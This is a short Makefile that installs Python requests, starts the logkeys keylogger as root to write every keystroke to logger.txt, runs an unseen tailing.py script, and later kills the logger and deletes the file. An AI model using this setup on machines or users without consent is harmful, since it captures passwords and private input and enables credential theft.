make:
	touch logger.txt
	pip install requests

start:
	sudo logkeys -k
	sudo logkeys -s --no-timestamps -o logger.txt
	python tailing.py

stop:
	sudo logkeys -k
	rm logger.txt

